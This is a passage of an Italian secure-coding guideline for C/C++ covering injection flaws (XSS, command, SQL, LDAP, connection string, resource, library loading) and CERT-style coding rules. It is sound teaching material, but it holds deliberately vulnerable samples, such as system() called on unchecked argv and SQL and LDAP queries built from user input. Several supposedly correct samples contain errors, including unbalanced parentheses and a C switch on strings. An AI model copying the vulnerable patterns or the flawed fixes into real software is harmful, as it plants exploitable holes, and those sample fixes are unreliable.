 
 
Linee guida per lo sviluppo sicuro Pag. 47  a 156  
 
7 BEST PRACTICES PER LO SVILUPPO IN SICUREZZA  
Molti dei problemi di sicurezza del software sono d a attribuire alla scarsa conoscenza, da parte degli  
sviluppatori, delle principali vulnerabilità e dei possibili attacchi che potrebbero sfruttarle.  
 Il presente capitolo fornisce una vista delle prin cipali vulnerabilità e delle relative contromisure,  
contestualizzate per ogni specifica area di svilupp o (C/C++, Java, PL/SQL, etc), anche in termini di t ecniche 
da utilizzare per riconoscerle e difendersi opportu namente.  
7.1  C/C++  
Il linguaggio di programmazione procedurale denomin ato C fu sviluppato da Dennis Ritchie tra il 1969 e  il 
1973 presso i Bell Labs, con lo scopo di implementa re parti di sistema operativo Unix. Da allora è div entato 
uno dei linguaggi di programmazione più diffusi e u tilizzati, grazie alla sua grande potenza e flessib ilità. Il 
linguaggio C, infatti, consente al programmatore di  accedere alla memoria della macchina in maniera 
diretta, in modo da indirizzare e sfruttare qualsia si risorsa, software e hardware. 
 
Dal C deriva il linguaggio di programmazione C++ (o  CPP acronimo di “C plus plus”) , orientato agli og getti, 
con tipizzazione statica. È stato sviluppato (in or igine col nome di "C con classi") da Bjarne Stroust rup, 
sempre presso ai Bell Labs nel 1983 nell’ottica del la modernizzazione del linguaggio C.  
 
Poiché i linguaggi C e C++ hanno caratteristiche mo lto simili, ai fini della sicurezza del codice le v ulnerabilità 
e le relative contromisure sono da considerarsi val ide per entrambi i linguaggi. 
7.1.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross-site scripting (XSS) è una vulnerabilità c he affligge siti web dinamici che operano un contro llo 
insufficiente dell'input. Un XSS permette ad un att accante di inserire o eseguire codice script lato c lient, al 
fine di attuare i seguenti exploit:  
• raccolta, manipolazione e reindirizzamento di infor mazioni riservate;  
• visualizzazione e modifica di dati presenti sui ser ver;  
• alterazione del comportamento dinamico delle pagine  web. 
 
Rientrano nelle problematiche di tipo XSS: 
• Stored XSS . Gli attacchi di tipo “stored XSS” sono quelli in cui lo script iniettato viene memorizzato 
in modo permanente sui server di destinazione, come  ad esempio in un database, in un forum di 
messaggi, in un registro dei visitatori, in un camp o commentato, etc. Da quel momento in poi, ogni 
qualvolta verrà rischiesta la pagina che include lo  script memorizzato, quest’ultimo verrà 
rispristinato ed eseguito. 
• Reflected XSS . Gli attacchi XSS riflessi, noti anche come attacc hi non persistenti, si verificano 
quando uno script dannoso viene restituito da un'ap plicazione Web al browser della vittima. Sono 
più diffusi, proprio per la facilità di propagazion e: non è neessario individuare alcun meccanismo 
per memorizzare permanentemente gli script malevoli . Sono i più evitabili e spesso i danni che 
apportano sono di entità inferiore, rispetto agli s tored XSS. 
Come difendersi 
Convalidare tutti gli input, indipendentemente dall a fonte: la convalidazione dovrebbe essere basata s u una 
white list (una lista di valori ammessi), per cui v errebbero accettati solo i dati che corrispondono, e 
verrebbero rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
 
 
Linee guida per lo sviluppo sicuro Pag. 48  a 156  
 
Un altro accorgimento consiste nel codificare compl etamente tutti i dati dinamici (encoding) in modo d a 
neutralizzare eventuali inserimenti malevoli. La co difica dovrebbe essere sensibile al contesto, in ba se al 
tipo di dato che si vuole neutralizzare: se ci si a spetta che possa esserci codice HTML abusivo, occor re 
codificare gli eventuali tag HTML, se ci si potrebb e trovare di fronte a uno script, allora bisogna co dificare 
gli elementi sintattici di Javascript, ecc. 
Nell'intestazione di risposta HTTP Content-Type, de finire in modo esplicito la codifica dei caratteri (charset) 
per l'intera pagina. 
Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura tramite script de i cookie di 
sessione. 
 
Esempio:  
Se ci si affida a programmi C/C++ per una web appli cation, il pericolo è insito nella specifica CGI (C ommon 
Gateway Interface), che offre l'opportunità di acce dere al file system. 
La necessità di bonificare l’input può essere soddi sfatta sottoponendo le stringhe in entrata a una ro utine di 
encoding come la seguente: 
 
void encode(std::string& data) { 
  std::string buffer; 
  buffer.reserve(data.size()); 
  for(size_t pos = 0; pos != data.size(); ++pos) { 
    switch(data[pos]) { 
      case '&': buffer.append("&amp;");    break; 
      case '\"': buffer.append("&quot;");   break; 
      case '\'': buffer.append("&apos;");   break; 
      case '<': buffer.append("&lt;");    break; 
      case '>': buffer.append("&gt;");    break; 
      default:  buffer.append(&data[pos], 1); break ; 
    } 
  } 
  data.swap(buffer); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.1.2  Command Injection 
Come riconoscerla 
In questa tipologia di attacco, l’aggressore potreb be eseguire comandi di sistema arbitrari sul server  
dell’applicazione.  
Se è in grado di iniettare e fare eseguire un coman do di sistema operativo, l’aggressore può eseguire 
qualsiasi comando, fino all’acquisizione completa d el controllo del server. 
La command injection è possibile se si utilizzano s tringhe di input dell'utente per creare comandi di shell 
che poi vengono eseguiti.  
Come difendersi 
Di seguito un elenco delle azioni da intraprendere:  
• Evitare qualsiasi esecuzione diretta di script di c omandi utilizzando l’input utente. Utilizzare 
piuttosto API messe a disposizione dal linguaggio o  da librerie di funzioni. 
• Se è impossibile rimuovere l'esecuzione del comando , eseguire solo stringhe statiche che non 
includono l'input dell'utente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Operare una convalida dell’input 
attraverso una white list di valori ammessi e altri  controlli, come evidenziato nel punto precedente. 
• Eseguire l'applicazione utilizzando un account uten te limitato che non disponga di privilegi non 
necessari. 
 
 
Linee guida per lo sviluppo sicuro Pag. 49  a 156  
 
• Se possibile, isolare tutta l'esecuzione dinamica u tilizzando un account utente separato e dedicato, 
che abbia privilegi solo per le operazioni e i file  specifici utilizzati dall'applicazione, in base al  
principio del "Least Privilege". Il principio stabi lisce che agli utenti venga attribuito il più basso  
livello di “diritti” che possano detenere rimanendo  comunque in grado di compiere il proprio 
lavoro. 
 
Esempio: 
#include <stdio.h> 
#include <unistd.h> 
  
int main(int argc, char **argv) { 
  
 char cat[] = "cat "; 
 char *command; 
 size_t commandLength; 
  
 commandLength = strlen(cat) + strlen(argv[1]) + 1;  
 command = (char *) malloc(commandLength); 
 strncpy(command, cat, commandLength); 
 strncat(command, argv[1], (commandLength - strlen( cat)) ); 
  
 system(command); 
 return (0); 
} 
 
L’istruzione system() esegue un commando provenient e dall’input, non verificato né controllato. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html,   
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
7.1.3  Connection String Injection 
Come riconoscerla 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database.  
Utilizzando semplici strumenti di modifica testo, l 'aggressore potrebbe essere in grado di eseguire un a delle 
seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database dell'attaccant e al posto dell’originario; 
• Scoprire la password dell'account di sistema del da tabase. 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se tali valori non sono stati verificati né tantomeno 
sanificati, potrebbero essere utilizzati per manipo lare la stringa di connessione. 
Come difendersi 
L’input deve essere validato, come già evidenziato nei punti precedenti. 
Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente una 
stringa di connessione, cercare di non includere l' input dell'utente. In ogni caso, utilizzare utilità  basate 
sulla piattaforma, come SqlConnectionStringBuilder di .NET. 
 
Esempio:  
 
int main( int argc, char* argv[] )  
{  
 int result; 
 
 
Linee guida per lo sviluppo sicuro Pag. 50  a 156  
 
 if ( argc == 3 ) 
 { 
  char* databaseServer = argv[1]; 
  char* databaseName = argv[2]; 
   
  char connString[BUFFER_SIZE] = database_PROTOCOL_ STRING; 
  strncat( connString, databaseServer, sizeof(connS tring) - 
strlen(connString) - strlen(database_PORT_STRING) ) ; 
  strcat( connString, database_PORT_STRING ); 
 
  sql::mysql::MySQL_Driver* database_driver = 
sql::mysql::get_mysql_driver_instance(); 
  sql::Connection* database_conn = database_driver- >connect( 
connString, database_USER, database_PASSWORD ); 
  database_conn->setSchema( databaseName ); 
   
  result = processData( database_conn ); 
   
  delete database_conn; 
 } 
 return result; 
} 
 
Nell’esempio riportato, la stringa di connessione v iene costruita concatenando parametri di input. 
Nel codice che segue, la scelta da una white list è  obbligata: 
 
int main( int argc, char* argv[] )  
{  
 int result; 
 if ( argc == 2 ) 
 { 
  int appId = atoi( argv[1] ); 
 
  char* connString; 
  char* databaseName;  
  switch( appId ) {  
   case APP_ID1: 
    connString = CONN_STRING_APP1; 
    break; 
   case APP_ID2: 
    connString = CONN_STRING_APP2; 
    break; 
   case APP_ID3: 
    connString = CONN_STRING_APP3; 
    break; 
   default: 
    connString = CONN_STRING_DEFAULT; 
  } 
 
  sql::mysql::MySQL_Driver* database_driver = 
sql::mysql::get_mysql_driver_instance(); 
  sql::Connection* database_conn = database_driver- >connect(connString, 
database_USER, database_PASSWORD); 
   
  result = processData(database_conn); 
   
  delete database_conn; 
 } 
 return result; 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 51  a 156  
 
7.1.4  Resource Injection 
Come riconoscerla  
L'applicazione apre un socket di rete, per l'ascolt o delle connessioni in entrata, utilizzando dati no n 
attendibili per configurarlo, consentendo a un even tuale malintenzionato di controllarlo. 
Il malintenzionato potrebbe perciò essere in grado di aprire una backdoor che gli consenta di connette rsi 
direttamente al server delle applicazioni, acquisen do il controllo del server o esponendolo ad altri a ttacchi 
indiretti. In particolare, modificando il numero di  porta del socket, un utente malintenzionato può es sere in 
grado di aggirare controlli di rete deboli, mascher ando l'attacco da parte di altri dispositivi di ret e. 
Una resource injection può essere sfruttata anche p er bypassare i firewall o altri meccanismi di contr ollo 
degli accessi. Si può anche utilizzare l'applicazio ne come proxy per la scansione delle porte delle re ti interne 
e per l'accesso diretto ai sistemi locali; oppure i ndurre un utente a inviare informazioni riservate a  un server 
fasullo. 
Come difendersi  
Non consentire a un utente di definire i parametri relativi ai sockets di rete. Il principio della whi te list può 
essere adottato per scegliere un valore tra quelli ammissibili, codificandoli – ad esempio - in una sw itch. 
 
Esempio:  
 
int main( int argc, char* argv[] )  
{  
 int sockfd, portno; 
 struct sockaddr_in serv_addr = {};  
 struct hostent *server; 
  
 if ( argc != 3 ) 
  errorAndExit(); 
 
 server = gethostbyname(argv[1]); 
 if (server == NULL)    
  errorAndExit(); 
   
 portno = atoi(argv[2]); 
 
 serv_addr.sin_family = AF_INET; 
 memcpy(&serv_addr.sin_addr.s_addr, server->h_addr,  server->h_length); 
 serv_addr.sin_port = htons(portno); 
  
 sockfd = socket(AF_INET, SOCK_STREAM, 0); 
 if (sockfd < 0)  
  errorAndExit(); 
   
 if (connect(sockfd, &serv_addr, sizeof(serv_addr))  < 0)  
  errorAndExit(); 
 
 sendAndProcessMessage(sockfd); 
  
 close(sockfd); 
} 
In questo esempio la configurazione del socket vien e realizzata con l’input non verificato proveniente  
dall’utente. Qui di seguito la scelta è ristretta a  una white list: 
 
int main( int argc, char* argv[] )  
{  
 int sockfd, portno; 
 struct sockaddr_in serv_addr = {};  
 char* portname; 
  
 if ( argc != 1 ) 
  errorAndExit(); 
 
 
Linee guida per lo sviluppo sicuro Pag. 52  a 156  
 
 
 portname = argv[1]; 
 switch (portname) { 
  case "quicktime": 
   portno = 1220; 
   break; 
  case "kazaa": 
   portno = 1214; 
   break;  
  case "battlenet": 
   portno = 1119; 
   break; 
  default: 
   portno = 80; 
 } 
  
 serv_addr.sin_family = AF_INET; 
 memcpy(&serv_addr.sin_addr.s_addr, SERVER_ADDRESS,  strlen(SERVER_ADDRESS)); 
 serv_addr.sin_port = htons(portno); 
  
 sockfd = socket(AF_INET, SOCK_STREAM, 0); 
 if (sockfd < 0)  
  errorAndExit(); 
   
 if (connect(sockfd, &serv_addr, sizeof(serv_addr))  < 0)  
  errorAndExit(); 
 
 sendAndProcessMessage(sockfd); 
  
 close(sockfd); 
} 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.1.5  SQL Injection 
Come riconoscerla  
Si verifica quando l’input non verificato viene uti lizzato per comporre dinamicamente uno statement SQ L 
che poi verrà eseguito sulla base dati. Adeguatamen te manipolati, i parametri di input possono modific are 
le query in maniera sostanziale, causando danni di impatto notevole, come l’inserimento di dati malevo li, la 
cancellazione e la modifica di record e la rivelazi one indebita di informazioni riservate. Se i dati u tilizzati per 
la SQL injection sono memorizzati nel database o ne l file system in generale, si parla di SQL injectio n di 
second’ordine (second order SQL injection). 
Come difendersi 
Mettere in pratica i seguenti suggerimenti:  
• Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato 
nei punti precedenti. 
• Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Si 
devono invece utilizzare componenti di database sic uri come le stored procedure (stored 
procedures), query parametrizzate e le associazioni  degli oggetti (per comandi e parametri). 
• Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis. 
• Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari). 
 
Esempio:  
int main(int argc, char** argv) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 53  a 156  
 
 char *nomeUtente = argv[2]; 
  
 // Codice passibile di SQL Injection 
 char query[1000] = {0}; 
 sprintf(query, "SELECT USER_ID FROM UTENTI where n ome = \"%s\"", nomeUtente); 
 executeSql(query); 
  
 // Codice "sanificato" 
 char nomeUtenteSql[1000] = {0}; 
 encodeSqlString(nomeUtenteSql, 1000, nomeUtente);  
 char querySanificata[1000] = {0}; 
 sprintf(querySanificata, "SELECT USER_ID FROM UTEN TI where nome = \"%s\"", 
nomeUtenteSql); 
 executeSql(querySanificata); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.1.6  LDAP Injection 
Come riconoscerla 
Come in tutti i casi d’injection, anche in questo c aso a essere sfruttato per l’attacco è l’input dell ’utente, nel 
momento in cui viene utilizzato, senza subire alcun  controllo o filtro, per comporre una query LDAP. 
Il pericolo è che venga inquinata la directory LDAP , che contiene una base dati relativa a delle utenz e. 
Con un attacco LDAP injection è possibile leggere d ati riservati, come è anche possibile modificarli, 
cancellarli o inserire utenze che poi possono esser e utilizzate per successivi attacchi. 
 
Esempio:  
Il seguente codice riceve un parametro in input per  comporre una query LDAP. 
fgets(nomeUtente, sizeof(nomeUtente), socket); 
snprintf(queryLDAP, sizeof(queryLDAP, "(cn=%s)", no meUtente); 
 
Se nomeUtente è “Mario Rossi”, la query restituirà i dati relativi all’utente in questione, ma se vien e fornito 
il carattere “*”, verrà restituito l’intera directo ry di utenze.  
Come difendersi 
Occorre mettere in pratica le misure che seguono. C ome in altri tipi d’injection, sono fondamentali il  
controllo e l’encoding dell’input, per costruire fi ltri e query verso server LDAP. 
L’encoding deve filtrare i seguenti caratteri: \ # + < > , ; " = 
Altri caratteri scpeciali sono utilizzati all’inter no delle query LDAP e quindi non possono essere eli minati in 
automatico:  * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' 
Il controllo applicativo, dipendente dal contesto, assume un’importanza fondamentale. 
Anche ridurre al minimo i privilegi assegnati all’u tenza con la quale il server LDAP è avviato è una m isura 
utile a minimizzare le conseguenze di un attacco. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,   
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.1.7  Process control 
Come riconoscerla 
Le vulnerabilità del controllo di processo si verif icano quando nell'applicazione vengono importati da ti 
provenienti da un'origine non attendibile. Tali dat i vengono successivamente caricati utilizzando il m etodo 
Load-Library. Controllando il nome o il percorso de lla libreria, un utente malintenzionato può sostitu ire la 
 
 
Linee guida per lo sviluppo sicuro Pag. 54  a 156  
 
libreria legittima con una libreria dannosa. Ciò pu ò comportare l'esecuzione di comandi (e payload) 
dannosi. 
 
La vulnerabilità si esplicita in due forme distinte : l’aggressore controlla l’indirizzo della libreria  all’interno 
del programma, oppure controlla l’ambiente e quindi  la libreira puntata dal programma. 
Come difendersi 
Oltre al consueto principio dei minimi privilegi e il controllo dell’input, qui occorre verificare sem pre 
l’attendibilità delle librerie importate. 
L’applicazione non deve caricare librerie non neces sarie o delle quali può fare a meno. 
Invece dei path relativi, l’applicazione deve utili zzare path assoluti per individuare il percorso del le librerie 
da caricare. 
 
Esempio: 
Nel seguente codice la libreria viene caricata a pa rtire da un indirizzo scritto nel registry. Chiunqu e acceda 
al registry può sostituirlo con l’indirizzo di una copia manipolata della libreria medesima. 
 
RegQueryValueEx(hkey, "APP_HOME_DIR", 0, 0, (BYTE*) appHomeDir, &size); 
char* libreria=(char*)malloc(strlen(appHomeDir)+str len(INITLIB)); 
if (libreria) { 
  strcpy(libreria, appHomeDir); 
  strcat(libreria,INITCMD); 
  LoadLibrary(libreria); 
} 
 
Se si utilizza un percorso assoluto, la libreria vi ene prelevata da un percorso più difficilmente mani polabile. 
Utilizzare la System.load() in luogo della System.l oadLibrary(), perché più sicura. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/114.html,   
CWE-114: Process Control. 
7.1.8  Ulteriori indicazioni per lo sviluppo sicuro 
La raccolta di Best Practices che segue, è conforme  ai dettami degli standard CERT C / C++ Programming  
Language Secure Coding. 
7.1.8.1  Dichiarazioni 
• È consigliato dimensionare gli array non utilizzand o costanti numeriche ma piuttosto costanti 
simboliche definite  
Esempio:  
Forma non corretta:  
int mesi[13];   
Forma corretta:    
int mesi[TOT_MESI + 1]; 
 
• Dichiarare le costanti utilizzando la keyword "cons t” 
Esempio:  
Forma non corretta: 
int mesi = 12;  
Forma corretta: 
const unsigned int mesi = 12;  
• Dichiarare le variabili che possono avere valori po sitivi utilizzando la keyword "unsigned" 
• Il tipo "char" deve essere unsigned 
• Non utilizzare float e double quando non è necessar io (calcoli scientifici) 
• Le classi che hanno funzioni virtuali devono sempre  avere distruttori virtuali 
 
 
Linee guida per lo sviluppo sicuro Pag. 55  a 156  
 
• Inizializzazioni 
• Tutte le variabili locali devono essere inizializza te prima di essere utilizzate. Se sono inizializzat e con 
valori "dummy" o momentanei devono essere reinizial izzate con i valori reali al momento dell'uso. 
• Tutte le variabili legate ai cicli devono essere re inizializzate con l'entrata in una nuova iterazione  
prima di essere riutilizzate nel nuovo ciclo. 
• Tutte le strutture devono essere azzerate prima del  loro utilizzo. 
• Tutti i buffer devono essere azzerati prima del lor o utilizzo o riutilizzo. 
7.1.8.2  Utilizzo dei tipi di dati 
Stringhe 
• Tutte le stringhe devono essere terminate dal carat tere NULL. Evitare errori logici di 
programmazione che agevolino l’insorgere di una con dizioni di memory leak. Deve essere riposta la 
massima attenzione nell’utilizzo di funzioni che no n aggiungono al termine di una stringa copiata in 
un buffer di destinazione il carattere NULL se ques to non risiede nel buffer sorgente.  
Esempio: 
Forma non corretta: 
strncpy(dest, source, sizeof(dest));  
Forma corretta: 
strncpy(dest, source, sizeof(dest); 
dest[sizeof(dest) – 1] = ‘\0’; 
 
• Il codice non deve effettuare operazioni su una str inga o su un char arrayche non siano terminati 
dal carattere NULL;  
• L’input proveniente dall’utente deve sempre essere convalidato e scremato da caratteri invalidi ( ;| 
! & ~ ' " - * % ` \ / < > ? $ @ : ( ) [ ] { } . ) p rima di essere passato alle successive elaborazioni  
dell’applicazione (ad esempio alla funzione system( ) );  
• Utilizzare le funzioni strspn(), strcspn() e strpbr k() per filtrare l’input utente; 
• Il formato delle stringhe deve sempre essere specif icato nei parametri delle funzioni che lo 
richiedono. In questo contesto le funzioni consider ate critiche e soggette a problematiche di format 
string overflow, se non correttamente utilizzate, s ono: printf(), fprintf(), sprintf(), snprintf(), 
vprintf(), vfprintf(), vsprintf(), vsnprintf(), sca nf(), fscanf(), sscanf(), vscanf(), vsscanf(), vfsc anf(), 
wprintf(), fwprintf(), swprintf(), vwprintf(), vfwp rintf(), vswprintf(). 
Esempio: 
Forma non corretta: 
printf(buffer1); 
snprintf(dest, sizeof(dest), buf); 
fprintf(FILE, num, stringa); 
Forma corretta: 
printf(“%s\r\n”, buffer1); 
snprintf(dest, sizeof(dest), “%s”, buf); 
fprintf(FILE, “%d: %s%\n”, num, stringa); 
Buffer  
Tutti i buffer devono essere abbastanza grandi per contenere i dati a loro destinati, inoltre: 
• Evitare l’utilizzo di funzioni che non consentono d i specificare la dimensione delle stringhe copiate 
da un buffer sorgente a uno di destinazione. Le fun zioni considerate critiche in questo contesto, 
che non devono mai essere utilizzate sono: strcpy() , wcscpy(), sprintf(), strcat(), gets(), scanf(), 
vsprintf() e wcscat(); 
• Quando i dati vengono copiati all'interno di un buf fer deve essere sempre verificata la loro 
dimensione confrontandola con quella del buffer di destinazione. Le funzioni considerate critiche 
per errori di bound-checking, pur permettendo di sp ecificare la lunghezza delle stringhe soggette a 
copia da un buffer all’altro, sono: strncpy(), wcsn cpy(), snprintf(), strncat(), vsnprintf(), wcsncat( ), 
 
 
Linee guida per lo sviluppo sicuro Pag. 56  a 156  
 
memcpy(), memmove(), memset(), strxfrm(), wcsxfrm() , wmemset(), wmemcpy(), wmemmove(), 
wcstombs(), wcsrtombs(), mbstowcs(), mbsrtowcs(), s wprintf() e vswprintf().  
 
Di seguito alcuni esempi di funzioni solitamente co nsiderate sicure, ma utilizzate in modo errato. 
 
Esempio: 
Forma non corretta: 
char dest[512]; 
char *source; 
// puntatore char source manipolabile 
// dall’utente 
strncpy(dest, source, strlen(source));  
#define LEN 5000 
// LEN superiore alla capacità  
// di contenimento massima di  
// dest  
char dest[1024]; 
// variabile source manipolabile  
// dall’utente 
char source[LEN];  
memcpy(dest, source, LEN); 
 
Forma corretta: 
char dest[512]; 
strncpy(dest, source, sizeof(dest); 
/* inserimento di NULL alla fine di  
  dest 
*/ 
... 
#define LEN 1024; 
char dest[1024]; 
// variabile source manipolabile  
// dall’utente 
char source[LEN];  
memcpy(dest, source, LEN - 1); 
/* inserimento di NULL alla fine di  
  dest 
*/ 
...        
 
7.1.8.3  Bitfields 
Se nel codice vengono svolte operazioni di bit shif ting o si utilizzano bitfield, bisogna indicare le piattaforme 
con cui il codice è compatibile per mitigare proble mi/errori di porting. 
7.1.8.4  Macro 
Se le macro sono espanse, i parametri passati non d evono causare effetti collaterali. 
 
Esempio:  
Forma non corretta:  
#define max(a, b) (a) > (b) ? (a) : (b)  
risultato = max(i, j) + 3; 
/* 
 * tutto questo viene espanso in 
 * risultato = (i) > (j) ? (i) : (j)+3;  
 * 
 */  
 
Forma corretta: 
#define max(a,b) ( (a) > (b) ? (a) : (b) )  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 57  a 156  
 
Gli argomenti delle macro devono essere accuratamen te racchiusi in parentesi. 
7.1.8.5  L’operatore sizeof e il passaggio di dati come para metri 
Il passaggio della dimensione di una struttura dati  come parametro a una funzione deve essere effettua to 
in maniera corretta, tramite l’utilizzo della funzi one sizeof(). A tal proposito, è necessario svilupp are 
consapevolezza degli errori qui menzionati, e non r ipeterli: 
 
Esempio:  
Forma non corretta: 
strlen(struttura)  
sizeof(ptr) 
sizeof(*array) 
/* 
 * Dimensione di un solo elemento 
 */ 
sizeof(array) 
 
Forma corretta: 
sizeof(struttura) 
sizeof(*ptr) 
sizeof(array) 
/* 
 * Dimensione di un solo elemento 
 */ 
sizeof(array[0])  
 
Gli argomenti delle macro devono essere accuratamen te racchiusi in parentesi. 
7.1.8.6  Allocazione dinamica 
Il successo dei linguaggi C e C++ è dovuto alla gra nde flessibilità che offrono allo sviluppatore nell a gestione 
diretta della memoria della macchina. Ciò offre ill imitate possibilità, ma comporta anche rischi piutt osto 
elevati. Per mitigare tali rischi occorre adottare i seguenti suggerimenti: 
• Lo spazio di memoria allocato dinamicamente (ad ese mpio con le funzioni malloc(), 
calloc() e realloc() deve essere appropriato alla d imensione dei dati che deve 
contenere; 
• L’applicazione deve provvedere all’allocazione e al la deallocazione della memoria. 
Nell’ambito della programmazione multithreaded, val e lo stesso principio: ogni 
thread deve allocare e deallocare la propria memori a, senza delegare la 
deallocazione ad altri thread; 
• Se si scrive codice C++ è meglio sfrutttare le cara tteristiche peculiari di questo 
linguaggio, piuttosto che appoggiarsi alle struttur e del C, mantenute per 
compatibilità. Esempio: utilizzare "new" invece che  malloc(), calloc(), e 
realloc() ; 
7.1.8.7  Deallocazione  
• Gli array non devono essere cancellati come dati sc alari; 
Esempio:  
      Forma non corretta: 
delete mioarray;  
      Forma corretta: 
delete [ ] mioarray; 
 
• Non devono esistere puntatori a risorse distrutte: contestualmente alla distruzione delle risorse 
vanno dereferenziati tutti i puntatori; 
• I puntatori relativi alla memoria allocata dinamica mente devono essere impostati a NULL subito 
dopo essere stati rilasciati; 
• I puntatori ottenuti via malloc(), calloc(), realloc()  devono essere distrutti con free()  (mai usare delete); 
 
 
Linee guida per lo sviluppo sicuro Pag. 58  a 156  
 
• I puntatori ottenuti via new devono essere distrutt i con delete (mai usare free() ); 
• Mai liberare un’area di memoria (ad esempio con free() ) già deallocata. Evitare errori logici nel 
codice che consentano l’insorgere di problematiche di questo tipo; 
• Mai tentare di scrivere in un buffer residente in h eap memory dopo la sua deallocazione. Evitare 
l’insorgere di errori logici di questo tipo. 
7.1.8.8  Puntatori 
• Gestire opportunamente i puntatori a NULL; 
Esempio:  
Forma non corretta: 
char tmpchar1 (char *s) 
{  
  return *s; 
} 
//”s” ==  NULL  CRASH  
 
Forma corretta: 
char tmpchar1 (char *s) 
 
{ 
   if (s == NULL) return ‘\0’; 
   return *s; 
} 
7.1.8.9  Casting e problematiche di gestione delle variabili  numeriche 
• Il tipo NULL  deve essere corretto mediante casting quando passa to come parametro a una funzione; 
• Ridurre al minimo le comparazioni fra interi di tip o signed. Se due interi di tipo signed vengono 
comparati, deve essere previsto il caso “minore di zero” ( < 0  ), soprattutto quando la comparazione 
avviene con un valore costante.  
Esempio: 
Comparazione non signed: 
if ((int)val1 < (unsigned int)val2) 
/* in questo caso unsigned ha la precedenza essendo  un tipo più grande di 
signed. Entrambi i valori  
(val1 e val2) vengono quindi  
convertiti ad unsigned prima di essere comparati 
*/ 
if ((int)val < sizeof(costante)) 
// l’operatore sizeof è unsigned 
 
Comparazione signed: 
if ((int)val < 256) 
if (unsigned short)val1 < (short)val2) 
/* la seguente comparazione dovrebbe, in base al ti po di compilatore, essere 
signed perchè entrambi gli short dovrebbero essere convertiti a signed integer 
prima di essere comparati 
*/ 
 
• Evitare di utilizzare variabili signed integer come  length specifier, ovvero come indicatori 
dell’allocazione/dimensione di un buffer o di un ar ray. 
• Evitare che un intero, a seguito di un’operazione d i moltiplicazione, addizione o sottrazione, cresca 
oltre il suo valore massimo o decresca sotto il suo  valore minimo. Ad esempio su architettura a 32 
bit se un intero signed a 16 bit dal valore 32767 v iene incrementato di una unità, il suo valore 
diverrà -32768, producendo un errore di overflow. È  bene assicurarsi che questo genere di 
condizioni non si verifichi in alcun caso, soprattu tto su input fornito dall’utente, in prossimità 
dell’allocazione di un buffer o della copia di dati  da un buffer all’altro. 
 
 
Linee guida per lo sviluppo sicuro Pag. 59  a 156  
 
• La conversione fra interi di differenti dimensioni deve essere il più possibile evitata. La conversion e 
di un intero di grandi dimensioni a uno più piccolo  (da 32 a 16 bit o da 16 a 8 bit) può causare il 
troncamento del valore memorizzato in una variabile  o determinarne il cambio di segno. Ad 
esempio convertire l’intero signed a 16 bit -1 in i ntero unsigned a 32 bit darà come risultato il 
valore 4.294.967.295 
In particolare sono negate tutte le conversioni rip ortate nella seguente tabella: 
Da  A 
16 bit signed  32 bit unsigned  
32 bit signed  16 bit unsigned  
32 bit unsigned  16 bit signed  
32 bit signed  16 bit signed  
 
Il codice non deve affidarsi a conversioni implicit e e/o dedotte dal compilatore. 
7.1.8.10  Computazione e condizionali 
• I dati devono essere appropriatamente confrontati c on altri dello stesso tipo, specialmente per i 
tipi float e double.  
Esempio:  
if ( variabile == 0.1 )  questa condizione potrebbe non rivelarsi mai vera,  per le proprietà di 
arrotondamento del compilatore; 
• Le variabili dichiarate come unsigned non devono ma i essere confrontate con lo zero utilizzando 
l'operatore "maggiore di".  
Esempio: if ( variabile > 0) risulta sempre vero se  variabile è unsigned; 
• Le variabili dichiarate come signed, non devono mai  essere confrontate con TRUE. 
Esempio: if (variabile) 
Se ad esempio variabile può assumere un valore nega tivo è meglio prevedere questo caso con un 
controllo del tipo: if (variabile != 0) oppure anco ra più esplicito controllando il segno dell’intero.  
7.1.8.11  Controllo del flusso 
Variabili di controllo  
È obbligatorio utilizzare sempre un limite superior e "inclusive" e il limite inferiore come "esclusive ".  
Esempio: 
Forma non corretta: 
x >= 23 e x <= 42 
Forma corretta: 
x >= 23 e x < 43 
Switches  
• Ogni blocco di codice appartenente a ogni “case” di  uno switch deve essere terminato dalla 
keyword "break";  
• Ogni switch deve avere un “case” di default. 
7.1.8.12  Passaggio di argomenti 
